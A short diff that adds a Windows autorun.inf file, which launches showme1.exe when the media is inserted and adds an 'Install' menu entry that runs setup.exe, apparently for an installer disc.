@@ -1,0 +1,6 @@
+[autorun]
+open=showme1.exe
+icon=setup.exe, 0
+shell\install=Install
+shell\install\command=setup.exe
+
